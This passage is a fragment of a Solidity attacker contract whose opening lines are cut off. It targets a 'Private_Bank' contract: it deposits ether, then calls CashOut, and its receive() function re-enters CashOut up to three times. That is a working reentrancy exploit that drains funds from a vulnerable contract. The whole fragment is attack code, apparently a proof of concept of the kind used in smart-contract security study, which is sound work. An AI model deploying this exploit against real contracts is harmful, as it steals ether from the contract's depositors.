    Private_Bank private bank;
    uint public attackCount;
    uint public amount;

    constructor(Private_Bank _bank, uint _amount) {
        bank = _bank;
        amount = _amount;
    }

    function deposit() public payable {
        bank.Deposit{value: msg.value}();
    }

    function attack() public {
        bank.CashOut(amount);
    }

    receive() external payable {
        attackCount++;
        if (attackCount < 3) {
            bank.CashOut(amount);
        }
    }
}

